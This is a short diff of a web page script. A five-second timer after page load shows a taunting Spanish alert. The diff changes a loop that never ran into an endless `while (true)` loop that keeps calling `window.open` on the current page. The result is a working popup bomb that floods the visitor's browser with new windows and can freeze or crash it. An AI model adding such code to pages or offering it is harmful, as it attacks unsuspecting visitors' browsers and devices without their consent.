@@ -18,7 +18,7 @@ window.addEventListener('load', () => {
     setTimeout(() => {
         alert('Ah... ¿Seguís acá, masoquista?');
     
-        for (let i = 0; i > 0; i++) {
+        while (true) {
             window.open(window.location.href);
         }
     }, 5000);
